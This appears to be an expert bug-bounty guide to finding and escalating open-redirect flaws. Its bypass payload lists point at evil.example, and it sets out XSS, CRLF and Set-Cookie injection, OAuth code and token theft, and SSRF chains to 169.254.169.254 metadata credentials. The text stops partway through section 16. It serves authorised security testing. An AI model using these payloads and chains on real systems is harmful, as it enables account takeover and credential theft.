# Open Redirect — Complete In-Depth Testing Guide (Expert / Bug-Bounty & Red-Team Edition)

**Author:** x8bitranjit
**Scope:** Any place the app takes a **client-controlled URL/host/path** and uses it to **redirect the browser** (HTTP `Location`, HTML meta-refresh, or JavaScript `location=`) or to **build an outbound link** — `?next=`/`?returnUrl=`/`?redirect=`/`?url=`/`?dest=`, login/logout/SSO `redirect_uri`, "continue to", email/verify links, `window.location` sinks
**Platforms:** Any stack; Kali/WSL for tooling
**Companion files in this folder:**
- `OPEN_REDIRECT_ARSENAL.md` — every bypass payload (scheme, `@`-userinfo, `\`/`//`, whitelist-suffix, encoding, CRLF, data:/javascript:) copy-paste
- `OPEN_REDIRECT_CHECKLIST.md` — the testing-order checklist you tick per app
- `OPEN_REDIRECT_REPORT_TEMPLATE.md` — the report skeleton that gets paid (impact-first)
- `Open_Redirect_Zero_to_Expert.md` — study + field-reference Q&A
- `poc/` — runnable tooling (parameter+redirect fuzzer, payload matrix generator, benign token/code catcher)

> **Companion to the OAuth / SSO, Host-Header, SSRF, CORS and XSS guides.** Open redirect is the class hunters most often *under-report* ("the site redirects to my URL — Low") **and** most often *mis-report* (a same-site redirect that isn't attacker-controlled). The truth is in the middle: a bare open redirect is Low/Medium, but the same primitive is the **detonator** for the expensive bugs — **OAuth `code`/`token` theft → account takeover**, **SSRF allow-list bypass**, **WAF/filter bypass**, **CSP `report-uri`/`frame-ancestors` and cookie-scoping games**, and **credible phishing on a trusted origin**. The finding is not "it redirects." The finding is **where the redirect lands and what rides along with it.**

---

> ### ⚡ READ THIS FIRST — why most open-redirect reports underpay (or get closed)
> 1. **"It redirects off-site" is the condition, not the ceiling.** Alone, an open redirect is usually **Low–Medium** (phishing enabler). It becomes **High–Critical** when it **leaks a secret in transit** (OAuth `code`/`token`, SAML `RelayState`, a reset token, a session in the URL) or **bypasses a security control** (SSRF allow-list, WAF host check, SSO `redirect_uri` validation). Report the chain, not the hop.
> 2. **The OAuth chain is the money bug.** If a login/SSO flow reflects your redirect target and an `access_token`/`code` is appended to it, you set the target to a host you control → the victim's token is delivered to **you** → **account takeover** (§11). This is *the* reason redirect-validation exists, and *the* reason it pays.
> 3. **Whitelist bypasses are the whole game.** Almost every real target *tries* to validate the redirect. Your job is the parser gap: `@`-userinfo (`https://target.com@evil.com`), backslash (`https:/\evil.com`), protocol-relative (`//evil.com`), whitelisted-substring (`https://target.com.evil.com`, `https://evil.com/target.com`), encoding (`%2f%2f`, `%09`, `%00`, unicode dot), and `\r\n` CRLF (→ header injection). The Arsenal is the payload catalogue; §7–§9 is the method.
> 4. **`javascript:` / `data:` in a redirect sink = XSS, not "just" redirect.** If the sink is a client-side `location = userinput` (DOM) or an anchor `href`, `javascript:alert(document.domain)` fires script → this is **DOM-XSS via the redirect param** (§10), a whole severity tier up. Always try the script schemes.
> 5. **Server-side "redirect" that the *server* follows = SSRF, not open redirect.** If the app *fetches* your URL server-side (link preview, webhook, image proxy) rather than sending the browser a `Location`, that's **SSRF** — an open redirect on an allow-listed host is the classic SSRF **allow-list bypass** (§12). Know which one you have; they pay differently.
>
> **Where the money is (memorize this order):** ① **redirect → OAuth/SSO `code`/`token` theft → account takeover — High–Critical** → ② **`javascript:`/`data:` redirect sink → DOM-XSS → session/ATO — High** → ③ **redirect used to bypass an SSRF allow-list / WAF host check → internal/metadata — High–Critical** → ④ **reset-token / session-in-URL leak via redirect → ATO — High** → ⑤ **credible phishing / cookie-scoping / CSP bypass on a trusted origin — Medium** → ⑥ *then* a bare off-site redirect with nothing riding along — **Low**.

---

## Table of Contents

**▶ [Master Testing Sequence — the testing order](#master-testing-sequence--the-testing-order)**

**PART I — FOUNDATIONS, RECON & BASELINE**
1. [Environment & Tooling Setup](#1-environment--tooling-setup)
2. [Open-Redirect Anatomy — Sinks, Sources & Why It Pays](#2-open-redirect-anatomy)
3. [Reconnaissance — Find Every Redirect Parameter & Sink](#3-reconnaissance--find-every-redirect-parameter--sink)
4. [Baseline — Can You Steer the Redirect Off-Origin?](#4-baseline--can-you-steer-the-redirect-off-origin)

**PART II — INJECTION & BYPASS (work in this order)**
5. [The Redirect Sinks — Header, Meta, JavaScript](#5-the-redirect-sinks--header-meta-javascript)
6. [Reflection vs Redirect — Where Does Your URL Land?](#6-reflection-vs-redirect--where-does-your-url-land)
7. [Bypassing Redirect Validation — the Parser-Gap Matrix](#7-bypassing-redirect-validation--the-parser-gap-matrix)
8. [Whitelist / Allow-list Bypasses](#8-whitelist--allow-list-bypasses)
9. [Encoding, CRLF & Filter Evasion](#9-encoding-crlf--filter-evasion)

**PART III — EXPLOITATION BY IMPACT (where the money is)**
10. [`javascript:` / `data:` Redirect → DOM-XSS ⭐](#10-javascript--data-redirect--dom-xss)
11. [OAuth / SSO `redirect_uri` → Token/Code Theft → Account Takeover ⭐](#11-oauth--sso-redirect_uri--tokencode-theft--account-takeover)
12. [Redirect as SSRF Allow-list / WAF Bypass ⭐](#12-redirect-as-ssrf-allow-list--waf-bypass)
13. [Token / Session / Secret Leak via Redirect](#13-token--session--secret-leak-via-redirect)
14. [Phishing, Cookie-Scoping, CSP & Chaining](#14-phishing-cookie-scoping-csp--chaining)

**PART IV — VALIDITY, SEVERITY & REPORTING (the bug-bounty layer)**
15. [The Validity-First Mindset](#15-the-validity-first-mindset)
16. [False Positives — STOP reporting these](#16-false-positives--stop-reporting-these-auto-reject-list)
17. [Severity Calibration](#17-severity-calibration--how-triagers-really-rate-open-redirect)
18. [Impact-Escalation Playbooks — "you found X, now do Y"](#18-impact-escalation-playbooks--you-found-x-now-do-y)
19. [Building a Professional, Safe PoC](#19-building-a-professional-safe-poc)
20. [Reporting, CWE/CVSS & De-duplication](#20-reporting-cwecvss--de-duplication)
21. [Automation & Red-Team Notes](#21-automation--red-team-notes)

**Appendices**
- [Appendix A — Open-Redirect Workflow Cheat Sheet](#appendix-a--open-redirect-workflow-cheat-sheet)
- [Appendix B — Open-Redirect Decision Tree](#appendix-b--open-redirect-decision-tree)
- [Appendix C — Important Links & References](#appendix-c--important-links--references)

---

# Master Testing Sequence — The Testing Order

> **This is the spine.** Work top-to-bottom. Numbered sections (1–21) are reference detail; this is the order you execute.

```
PHASE 0  RECON            → find every redirect PARAM & SINK: ?next/return/url/dest/redirect, login/logout/SSO
                            redirect_uri, meta-refresh, JS location= sinks, email/verify links (§3)
PHASE 1  BASELINE  ★      → can you steer the target OFF-origin at all? plain evil.com, then //evil.com (§4)
PHASE 2  INJECT/BYPASS    → identify the sink (header/meta/JS §5) · reflect-vs-redirect (§6) ·
                            beat validation: parser-gap matrix (§7) · whitelist bypass (§8) · encoding/CRLF (§9)
PHASE 3  IMPACT  ⭐ (money)→ escalate the redirect:
                            javascript:/data: → DOM-XSS (§10) · OAuth/SSO code/token THEFT → ATO (§11) ·
                            SSRF allow-list / WAF bypass → internal/metadata (§12) ·
                            token/session/secret leak → ATO (§13) · phishing/cookie/CSP chain (§14)
PHASE 4  VALIDATE→REPORT  → validity (§15) · false-positive filter (§16) · severity+CVSS+CWE-601 (§17) ·
                            SAFE PoC: own accounts, benign marker host, catch YOUR OWN token (§19) · dedup (§20)
```

**Phase-by-phase, with the deliverable before moving on:**

1. **PHASE 0 — Recon.** Enumerate every **redirect parameter and sink**: query params (`next`, `returnUrl`, `redirect`, `url`, `dest`, `continue`, `r`, `u`, `goto`, `return_to`, `callback`, `image_url`), login/logout/SSO `redirect_uri`, meta-refresh, JS `location`/`assign`/`replace`/`href` sinks, and links in emails (§3). *Deliverable:* a list of `(endpoint, param, sink-type)` triples.
2. **PHASE 1 — Baseline ⭐.** For each candidate, determine whether you can push the browser **off the app's origin** — first with a plain `https://evil.com`, then `//evil.com` (§4). *Deliverable:* a param that produces an off-origin redirect (or a validated one to bypass).
3. **PHASE 2 — Inject/bypass.** Nail the **sink type** (`Location` header vs `<meta>` vs JS §5), confirm reflect-vs-redirect (§6), and if validation blocks you, walk the **parser-gap matrix** (§7), whitelist bypasses (§8), and encoding/CRLF (§9). *Deliverable:* attacker-controlled redirect target confirmed.
4. **PHASE 3 — Impact ⭐.** Convert the redirect into the highest impact: `javascript:`/`data:` → DOM-XSS (§10), OAuth/SSO `code`/`token` theft → ATO (§11), SSRF allow-list / WAF bypass (§12), token/session/secret leak (§13), phishing/cookie/CSP chain (§14). *Deliverable:* a demonstrated impact (fired script / stolen token to your host / internal reach).
5. **PHASE 4 — Validate → report.** Apply validity & FP filters (§15/§16), set CVSS/CWE-601 (§17), build a *safe* PoC that catches **your own** token on **your own** marker host (§19), de-dup, write it (§20). *Deliverable:* the submitted report.

Reference anytime: payloads → `OPEN_REDIRECT_ARSENAL.md`; checklist → `OPEN_REDIRECT_CHECKLIST.md`; scripts → `poc/`; playbooks **§18**.

---

# PART I — FOUNDATIONS, RECON & BASELINE

# 1. Environment & Tooling Setup

| Tool | Job |
|------|-----|
| **Burp Suite** (Repeater/Intruder) | tamper redirect params, follow/inspect `Location`, replay OAuth flows; the core tool |
| **curl** | fast CLI redirect tests (`-D -` to see `Location` without following; `-L` to follow) |
| **`poc/openredir_fuzz.py`** | spray the bypass matrix at a param; flag any off-origin `Location`/meta/JS redirect (control-baselined) |
| **`poc/redirect_payloads.py`** | generate the full bypass payload matrix for a given target host + attacker host |
| **`poc/token_catcher.py`** | a benign local listener that logs any `code`/`token`/fragment delivered to your marker host (own-token PoC) |
| **a domain/host you control** (`evil.example` / an interactsh host) | the redirect target + the token-capture endpoint |
| **`gau` / `waybackurls` / `katana` / `hakrawler`** | harvest historical & live URLs to find redirect params at scale |
| **`gf` (redirect patterns)** | grep a URL list for likely redirect params (`gf redirect`) |
| **Param Miner / Arjun** | discover **hidden** redirect params the site doesn't link |
| **DOM Invader (Burp) / browser devtools** | trace client-side `location`/`href`/`assign` sinks for the JS/`javascript:` variants |

```bash
# Kali/WSL — see the Location header WITHOUT following it
curl -s -D - -o /dev/null "https://target/login?next=https://evil.example" | grep -i '^location:'

# harvest + grep candidate params, then fuzz
gau target.com | gf redirect | tee redir-candidates.txt
python3 poc/openredir_fuzz.py -u "https://target/login?next=FUZZ" --target target.com --evil evil.example
```
> **Don't follow redirects blindly.** Use `curl -D -` / Burp "do not follow" so you can read the raw `Location` value — a `302` to `https://evil.example` is your proof; a `200` that *renders* your URL in a meta/JS sink is a different (client-side) variant (§5/§6).

---

# 2. Open-Redirect Anatomy

## 2.1 What it is
The app takes a **URL, host, or path from the client** (query param, POST field, path segment, sometimes a header) and uses it to send the browser somewhere — an HTTP `3xx` `Location`, an HTML `<meta http-equiv=refresh>`, or a JavaScript `location = ...`. If the value isn't restricted to the app's own origin, an attacker chooses the destination → **open redirect**. It's a member of the **"trusting client-controlled URLs"** family alongside SSRF (server follows it) and the OAuth `redirect_uri` bugs (a *validated* redirect done wrong).

## 2.2 The three sinks (decides how you exploit)
```
HTTP HEADER    Location: <user-url>            → 30x server redirect. Classic. Also the CRLF/header-injection vector (§9).
HTML META      <meta http-equiv="refresh" content="0;url=<user-url>">   → client follows; javascript: often blocked here.
JAVASCRIPT     location=<user> / location.href=<user> / location.assign/replace / window.open   → DOM sink;
               javascript:/data: here = DOM-XSS (§10). This is the highest-value sink.
LINK/ANCHOR    <a href="<user-url>"> built from input → user-click redirect; javascript: href = XSS on click.
```

## 2.3 The sources (where the URL comes from)
```
QUERY PARAM   ?next= ?return= ?returnUrl= ?redirect= ?redirect_uri= ?url= ?u= ?r= ?dest= ?destination=
              ?continue= ?goto= ?return_to= ?returnTo= ?callback= ?checkout_url= ?ReturnUrl= ?forward= ?to=
              ?out= ?view= ?image= ?image_url= ?file= ?page= ?path= ?domain= ?host= ?window= ?target= ?rurl=
PATH SEGMENT  /redirect/<url>   /out/<url>   /link/<b64url>
POST FIELD    login "returnUrl" hidden field; logout target; SSO RelayState
HEADER        Referer-based "go back" redirects; Host (see Host-Header kit)
FRAGMENT      #<url> read by client JS (DOM open redirect — never hits the server)
```

## 2.4 Why it pays
- **It carries secrets off-origin.** OAuth `code`/`token`, SAML `RelayState`, reset tokens, session-in-URL — any of these appended to a redirect you control walk straight to your server → **ATO**.
- **It bypasses controls that trust an allowed host.** SSRF allow-lists, WAF host checks, and SSO `redirect_uri` validators all fall to a redirect *hosted on the allowed host* that bounces onward.
- **It launders phishing through a trusted domain.** `https://bank.com/login?next=https://evil.com` is a real `bank.com` link → high click-through.
- **The JS sink is XSS.** `javascript:` in a client redirect sink is script execution.

> **The mental model:** an open redirect is a **client-controlled destination**. Severity = *what travels with the browser to that destination* (a token → ATO), *what control it steps around* (an allow-list → SSRF), or *what scheme the sink accepts* (`javascript:` → XSS). Bare, it's a phishing aid — Low/Medium.

---

# 3. Reconnaissance — Find Every Redirect Parameter & Sink

```
□ QUERY PARAMS: crawl + historical URLs; grep for the name-set in §2.3 (gau|gf redirect, katana, hakrawler).
□ HIDDEN PARAMS: Arjun / Param Miner against login, logout, SSO, checkout, "share", "download", "preview" endpoints.
□ LOGIN / LOGOUT / SSO: the redirect_uri / returnUrl / RelayState / continue value — the #1 place, and the OAuth chain (§11).
□ META-REFRESH & JS SINKS: view-source for <meta http-equiv=refresh>; DOM Invader / grep JS for
    location=, location.href=, location.assign(, location.replace(, window.open(, .src=, document.location.
□ EMAIL / VERIFY / INVITE LINKS: the "continue to" / "back to app" URL in transactional emails is often host/param-derived.
□ FRAGMENT-DRIVEN: client code reading location.hash / location.search then redirecting = DOM open redirect (§10).
□ PATH-BASED: /redirect/, /out/, /r/, /link/, /exit/, /away/, /leave/, /track/ style "outbound link" handlers.
□ SERVER-FETCH LOOKALIKES: link preview, webhook, avatar-by-URL, "import from URL" — these are SSRF (§12), test as SSRF.
```
> **If this → then that:** an SSO/login flow has a **`redirect_uri`/`returnUrl`** → that's your first and highest-value target (§11). A **client-side** `location.href = new URLSearchParams(location.search).get('url')` pattern → DOM open redirect *and* a `javascript:` DOM-XSS candidate (§10). A **"preview this URL"** feature → treat it as SSRF, not open redirect (§12).

---

# 4. Baseline — Can You Steer the Redirect Off-Origin?

**Do this before chasing a specific impact.** Establish that the destination is attacker-influenced at all.

## 4.1 The baseline probes (run in this order — cheapest bypass first)
```
1. Plain absolute:      ?next=https://evil.example         → do you land on evil.example? (naive apps: yes)
2. Protocol-relative:   ?next=//evil.example               → browser treats // as scheme-relative → off-origin (very common win)
3. Backslash tricks:    ?next=/\evil.example   ?next=\/\/evil.example   ?next=https:/\evil.example
4. Whitelist-append:    ?next=https://target.com.evil.example   ?next=https://evil.example/target.com   ?next=https://evil.example#target.com
5. Userinfo:            ?next=https://target.com@evil.example    ?next=https://evil.example\@target.com
6. Scheme-less host:    ?next=evil.example                 (some servers prepend https://)
```

## 4.2 Classify what you can do
```
□ Off-origin redirect works plainly (or with //)        → confirmed open redirect → hunt the sink/impact (§10–§14).
□ Blocked, but a parser-gap payload works (§7/§8)        → confirmed with a bypass → same escalation.
□ Only same-origin paths allowed (leading / enforced)   → try //, /\, whitelist-append (§8); else likely safe.
□ Value is a redirect_uri in an OAuth/SSO flow           → straight to the token-theft chain (§11) — top priority.
□ Client-side JS sink                                    → try javascript:/data: for DOM-XSS (§10), not just off-origin.
□ Server FETCHES the URL                                 → it's SSRF — pivot to the SSRF kit (§12).
```

> **Don't stop at "it redirects to evil.example."** That's Phase 1. The report is the **escalation**: a token stolen (§11/§13), a script fired (§10), a control bypassed (§12), or — if none exist — a *credible* phishing PoC on the trusted origin (§14, Low–Medium). A bare off-origin redirect with nothing else is Low (§16).

---

# PART II — INJECTION & BYPASS (work in this order)

> Full payload lists are in `OPEN_REDIRECT_ARSENAL.md`.

# 5. The Redirect Sinks — Header, Meta, JavaScript

Identify the sink first — it decides which payloads work and what the ceiling is.

```
A. HTTP Location (30x):   response is 301/302/303/307/308 with Location: <your-value>.
   - Test: curl -D - -o /dev/null ; read the Location line.
   - Ceiling: off-origin redirect; + CRLF → header/response injection (§9); rarely javascript: (browsers ignore it in Location).
B. Meta-refresh:          <meta http-equiv="refresh" content="0; url=<your-value>"> in a 200 body.
   - Ceiling: off-origin redirect; javascript: usually blocked by browsers in meta; data:text/html sometimes works.
C. JavaScript location:   location=, location.href=, .assign(), .replace(), window.open(), document.location=.
   - Ceiling: HIGHEST — javascript:/data: → DOM-XSS (§10). Also plain off-origin redirect.
D. Anchor href:           <a href="<your-value>">…</a> — user must click; javascript: href = XSS on click.
```
> **If this → then that:** it's a **JS `location` sink** → don't settle for off-origin; throw `javascript:alert(document.domain)` and `data:text/html,<script>…</script>` → DOM-XSS (§10), a full tier above a redirect. It's a **`Location` header** → also test `\r\n` injection → header/response injection → possible cache poisoning/XSS (§9, cross-ref Host-Header & RequestSmuggling kits).

---

# 6. Reflection vs Redirect — Where Does Your URL Land?

```
REDIRECTED (browser actually goes there):
  □ 30x Location: evil.example              → server open redirect (classic).
  □ meta/JS sends the browser to evil.example → client open redirect.
REFLECTED-ONLY (your URL appears but no navigation):
  □ echoed into an href/src you must click   → click-through redirect (still valid, lower auto-severity).
  □ echoed into HTML unencoded               → maybe XSS, not (only) redirect — pivot to the XSS kit.
NEITHER (accepted, no effect):
  □ value ignored / normalized to a fixed path → not exploitable; keep hunting other params.
```
> **If this → then that:** your URL is **reflected into an `href`/`src` but not auto-followed** → it's a *user-interaction* open redirect (report it, but severity leans lower unless it feeds OAuth/phishing). Reflected **unencoded into HTML** → you may have XSS as well as/instead of redirect — test both. **Auto-navigation** to your host is the clean, higher-value result.

---

# 7. Bypassing Redirect Validation — the Parser-Gap Matrix

Most targets *try* to keep you on-origin. Every bypass exploits a **disagreement** between the validator's idea of the URL and the browser's. Walk them cheapest-first (full list in the Arsenal).

```
PROTOCOL-RELATIVE       //evil.example              /\evil.example        \/\/evil.example
                        (validator sees a "path", browser sees a host — the single most common win)
BACKSLASH CONFUSION     https:/\evil.example         https:\\evil.example   /%5cevil.example   /\/evil.example
                        (browsers treat \ as / in the authority; many validators don't)
@-USERINFO (auth)       https://target.com@evil.example      https://target.com%40evil.example
                        (everything before @ is userinfo; the real host is evil.example)
WHITELIST SUBSTRING     https://target.com.evil.example      https://evil.example/target.com
                        https://evil.example?x=target.com    https://evil.example#target.com
                        https://target.com.evil.example/     https://not-target.com   evil-target.com
MISSING SCHEME          evil.example      //evil.example      \/\/evil.example      (server prepends its own scheme)
TRIPLE-SLASH / EMPTY    https:///evil.example       ///evil.example       http:evil.example
IP / ALT HOST FORMS     http://0x7f000001   http://2130706433   http://[::]   http://127.0.0.1.nip.io   (mostly for SSRF §12)
CASE / TRAILING DOT     https://EVIL.example   https://evil.example.   (weak host compare)
```
> **The parser-gap rule:** the validator and the browser must **parse the same string differently**. `//`, `\`, and `@` are the three highest-yield gaps because browsers are lenient about the authority delimiter while naive validators aren't. If a payload is *accepted by validation but sends the browser off-origin*, you have the bug — confirm with `curl -D -` (read `Location`) or in a real browser (watch the address bar land on your host).

---

# 8. Whitelist / Allow-list Bypasses

When the app checks the target against an allowed domain/host, break the check:

```
CHECK: "does the URL CONTAIN target.com?"        → https://evil.example/target.com , https://evil.example?target.com ,
                                                    https://evil.example#target.com , https://target.com.evil.example
CHECK: "does it START WITH https://target.com?"  → https://target.com@evil.example , https://target.com.evil.example ,
                                                    https://target.com\.evil.example , https://target.com%2f@evil.example
CHECK: "does the HOST end with .target.com?"      → register/point evil.example as ...target.com.evil.example ;
                                                    or find a subdomain you can control (→ Subdomain-Takeover kit) that
                                                    legitimately ends with target.com → a WHITELISTED redirect you own.
CHECK: "is the host in {a,b,c}?"                  → an OPEN REDIRECT on one of a/b/c chains onward (redirect → redirect).
CHECK: parsed with a WEAK URL lib                 → embedded credentials, tab/newline (%09/%0a), NULL (%00), unicode dot
                                                    (。 U+3002, ｡), fullwidth chars, that split validator vs browser.
```
> **If this → then that:** the allow-list is **substring/`contains`** → put `target.com` in the *path/query/fragment* of an `evil.example` URL. It's **`startsWith`/prefix** → use `@`-userinfo or a `target.com.evil.example` subdomain. It's a **strict host allow-list** → look for an **open redirect on an already-allowed host** (redirect-chaining) or a **subdomain takeover** that hands you a host inside the allowed zone (cross-ref the Subdomain-Takeover kit — a taken-over `*.target.com` is a *whitelisted* redirect origin). The allow-list you can't beat directly, you beat by *owning something inside it*.

---

# 9. Encoding, CRLF & Filter Evasion

```
URL / DOUBLE ENCODING   %2f%2f evil.example   %2F%5Cevil.example   %252f%252fevil.example   (double-decode gaps)
WHITESPACE / CONTROL    https://evil.example%09   %0d%0a   %00   %20   (strip/normalize discrepancies; NULL truncation)
UNICODE / IDN           http://evil。example (U+3002 ideographic dot) , ｡ , fullwidth / , homoglyph target-lookalikes
CRLF INJECTION          ?next=https://target/%0d%0aLocation:%20https://evil.example
                        ?next=%0d%0aSet-Cookie:%20... → response-header injection (→ session fixation / cache / XSS)
                        (a redirect param reflected into the Location header + CRLF passthrough = HTTP response splitting)
FRAGMENT SMUGGLING      ?next=https://target.com#@evil.example   ?next=https://evil.example%2523  (client re-parse gaps)
DATA / JS SCHEME        javascript:alert(document.domain)   data:text/html;base64,PHNjcmlwdD4...  (JS sink → XSS §10)
```
> **If this → then that:** the redirect value is reflected **into the `Location` response header** and `\r\n` survives → you've escalated open redirect to **CRLF / HTTP response splitting** — inject `Set-Cookie` (session fixation), a second `Location`, or header-based XSS/cache poisoning (cross-ref the Host-Header & Request-Smuggling kits). Filters that decode **once** fall to **double-encoding**; filters that strip whitespace but not control chars fall to `%09`/`%0d%0a`/`%00`.

---

# PART III — EXPLOITATION BY IMPACT (where the money is)

> Use **your own** accounts, a **marker host you control**, and catch **your own** token (§19). Never harvest real users' tokens.

# 10. `javascript:` / `data:` Redirect → DOM-XSS ⭐

If the redirect sink is **client-side** (`location = value`, `location.href`, `.assign()`, `.replace()`, `window.open()`, or an anchor `href`), and it accepts a URL **scheme** you control, you get **script execution** — a full tier above a redirect.

```
1. Confirm a JS sink (§5): the param flows into location/href/assign/replace/window.open in the page's JS.
2. Fire script:
     ?next=javascript:alert(document.domain)
     ?returnUrl=javascript:alert(document.cookie)
     ?url=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+   (data: sink, if allowed)
3. Bypass naive scheme filters:
     java%09script:alert(1)   java\nscript:alert(1)   javascript:javascript:alert(1)   JaVaScRiPt:alert(1)
     javascript:alert(1)//   %6a%61%76%61%73%63%72%69%70%74:alert(1)
4. Weaponize (own session): read document.cookie / call an authenticated endpoint / steal the CSRF token → hand to the XSS kit.
```
> **If this → then that:** the sink is **`location.href = userInput`** (very common in SPAs reading `?url=`/`#url=`) and `javascript:` isn't stripped → **DOM-XSS**, not "just" open redirect. Report it as XSS (High, → session theft/ATO), and note the redirect as the source. A `Location` **response header** generally *won't* execute `javascript:` (browsers ignore non-`http(s)` schemes there) — this escalation is specific to the **client-side** sinks. See the XSS kit for weaponization.

---

# 11. OAuth / SSO `redirect_uri` → Token/Code Theft → Account Takeover ⭐

The single highest-value open-redirect chain. OAuth/OIDC and SAML deliver the `code`/`access_token`/`RelayState` **to a redirect target**; if you can steer that target off the legitimate client, the secret comes to **you**.

```
1. Find the flow: an "authorize" request carrying redirect_uri=/callback (OAuth) or an SP callback + RelayState (SAML).
2. The classic chains:
   A. LOOSE redirect_uri validation → set redirect_uri to a host you control → the code/token is delivered to you →
      you exchange/replay it → log in as the victim. (See the OAuth kit § ‘redirect_uri bypasses’.)
   B. OPEN REDIRECT ON THE ALLOWED CLIENT → redirect_uri points at target.com/redirect?next=//evil.example. The IdP
      validates target.com (allowed), sends the code to target.com's open redirect, which BOUNCES it — WITH the code in
      the URL/fragment — to evil.example. You just used an open redirect to defeat a STRICT redirect_uri allow-list. ⭐
   C. token/code in the FRAGMENT → a redirect that preserves the fragment (or a JS sink that reads it) leaks the
      access_token (implicit flow) to your host.
3. Prove (own accounts): run the flow with YOUR account; show the code/access_token arriving at YOUR marker host
   (token_catcher.py logs it); exchange it to confirm you're now authenticated as your own test victim → ATO.
```
> **If this → then that:** the IdP enforces a **strict `redirect_uri` allow-list** you can't beat directly, **but** the allowed client host has an **open redirect** → chain B: the open redirect *is* the bypass — the `code`/`token` rides the bounce to your host → **account takeover (High–Critical)**. This is why an open redirect on an OAuth `client` is never "just Low." Hand off to the **OAuth/SSO kit** for the full `redirect_uri`/`state`/PKCE/`response_mode` matrix; this kit owns the **open-redirect-as-the-bypass** half.

---

# 12. Redirect as SSRF Allow-list / WAF Bypass ⭐

When a **server** follows a URL (not the browser), an open redirect on an *allowed* host is the canonical way to walk an allow-list into the internal network.

```
SSRF ALLOW-LIST BYPASS:
  1. The SSRF sink only fetches allow-listed hosts (e.g. only *.target.com, or a fixed CDN).
  2. Find an OPEN REDIRECT on an allowed host: https://allowed.target.com/out?url=http://169.254.169.254/...
  3. Point the SSRF at the allowed open-redirect URL. The server fetches allowed.target.com (passes the allow-list),
     gets a 30x to 169.254.169.254, and (if it follows redirects) fetches the metadata endpoint → IAM creds. ⭐ CRITICAL.
  4. Watch for follow-redirect behavior; if the fetcher doesn't follow, use protocol-relative / DNS-rebind instead.
WAF / HOST-CHECK BYPASS:
  - A WAF or app that allow-lists a callback host → a redirect on that host reaches a blocked destination.
WEBHOOK / LINK-PREVIEW / IMAGE-PROXY:
  - These follow URLs server-side → treat the whole thing as SSRF; the open redirect is the allow-list pivot.
```
> **If this → then that:** you found an SSRF that's **locked to an allow-listed host**, *and* that host (or any allow-listed one) has an **open redirect** → chain them: the server fetches the allowed host, follows the redirect to `169.254.169.254`/internal → **metadata IAM creds / internal service → Critical**. Confirm the fetcher **follows redirects** (many do by default). Hand off to the **SSRF kit** for metadata/gopher/internal exploitation; this kit owns finding the redirect that unlocks the allow-list.

---

# 13. Token / Session / Secret Leak via Redirect

Beyond OAuth, any secret placed in a URL that then redirects off-origin leaks:

```
□ RESET / VERIFY TOKEN in the redirect: a "password reset" or "email verify" flow that redirects to a param-controlled
   URL WITH the token in the query/fragment → the token walks to your host → account takeover (cross-ref ATO kit).
□ SESSION IN URL (legacy jsessionid / ?sid=): redirect off-origin → session token in the Location / Referer → hijack.
□ REFERER LEAK: a page holding a secret in its URL that links/redirects off-origin leaks the secret via the Referer
   header to your host (unless Referrer-Policy blocks it) — subtle but real for reset/invite tokens.
□ CSRF TOKEN / API KEY in URL → same Referer/redirect leak path.
```
> **If this → then that:** a **reset/verify link** lands on a page that then redirects to a **client-controlled** URL while the **token is still in the URL/fragment/Referer** → the token leaks to your host → **ATO (High)**. Prove it with your own account (trigger your own reset, watch your own token arrive at your marker host). Cross-ref the **Account-Takeover** kit for the reset-flow specifics.

---

# 14. Phishing, Cookie-Scoping, CSP & Chaining

When there's no secret to steal and no server-fetch to bypass, the open redirect still has real, reportable value:

```
□ CREDIBLE PHISHING: https://trusted-target.com/login?next=https://evil.example — a REAL target.com link that lands the
   victim on your look-alike after "login". Higher click-through than a raw evil link. Medium (context-dependent).
□ COOKIE / CSP CHAIN: a redirect that lands on an attacker page under a trusted flow can help defeat SameSite/scoping
   assumptions or feed a CSP report-uri / frame-ancestors trick; usually a supporting hop in a bigger chain.
□ REDIRECT → XSS ON A SISTER APP: bounce to a same-parent-domain host that has XSS → escalate cookie theft (domain cookies).
□ REDIRECT-CHAIN LAUNDERING: target → allowed-open-redirect → evil, to defeat "the link starts with target.com" defenses.
□ OFFICE/ENTERPRISE ABUSE: some login portals' open redirects are used to bypass conditional-access "trusted URL" checks.
```
> **If this → then that:** no token, no server-fetch → build the **phishing PoC on the trusted origin** (real `target.com` link → your page) and report as **Medium** with a clear narrative ("a `target.com` URL sends the victim to an attacker page — credential phishing"). Don't inflate it to Critical; do explain the realistic abuse. If a **sister subdomain** has XSS, the redirect that reaches it can escalate to **domain-cookie theft** — chain it.

---

# PART IV — VALIDITY, SEVERITY & REPORTING

# 15. The Validity-First Mindset

## 15.1 The four questions a triager asks (answer them in your report)
1. **Is the destination attacker-controlled?** Show the `Location`/meta/JS sending the browser to **your** host (not a same-origin path, not a fixed partner).
2. **What rides along / what does it bypass?** A token (`code`/`access_token`/reset/session) → ATO; a `javascript:` scheme → XSS; an allow-list/WAF → SSRF. Name it.
3. **What interaction is needed?** Auto-redirect (no click) is stronger than an anchor the victim must click.
4. **Reproducible & in scope?** Exact request + the raw `Location`/rendered sink + the caught secret (own account).

## 15.2 The "redirect vs chain" rule (most important)
| You have | Standalone verdict | Becomes valuable when… |
|---|---|---|
| Off-origin `Location` redirect, nothing rides along | Low–Medium | …it carries an OAuth `code`/`token` (§11), reset/session token (§13), or enables credible phishing (§14). |
| `javascript:`/`data:` accepted by a JS sink | **High** | …it fires script → DOM-XSS → session/ATO (§10). |
| Open redirect on an OAuth `client` host | **High–Critical** | …you chain it to steal the `code`/`token` → ATO (§11). |
| Open redirect on an SSRF-allow-listed host | **High–Critical** | …the server follows it to internal/metadata (§12). |
| Redirect param reflected into `Location` + CRLF | **High** | …`\r\n` injects `Set-Cookie`/headers → response splitting (§9). |
| Anchor-`href` reflect (needs a click) | Low | …it feeds OAuth/phishing or is `javascript:` (XSS). |

## 15.3 Production-scope discipline
Confirm on **production** with your **own** accounts and a **marker host you control**. For the OAuth/token chains, catch **your own** token (never a real user's). Re-test partial fixes (blocking `https://evil` but not `//evil` or `\/\/evil` is a fresh valid finding).

---

# 16. False Positives — STOP reporting these (auto-reject list)

| # | Commonly mis-reported | Why it's NOT (by default) | When it IS valid |
|---|---|---|---|
| 1 | **Same-origin redirect** (`?next=/dashboard` → app enforces leading `/`) | Never leaves the origin. | A `//`/`\`/`@` payload actually reaches an off-origin host. |
| 2 | **Redirect to a fixed/allow-listed PARTNER** you can't change | Not attacker-controlled. | You can steer it to *your* host via a bypass. |
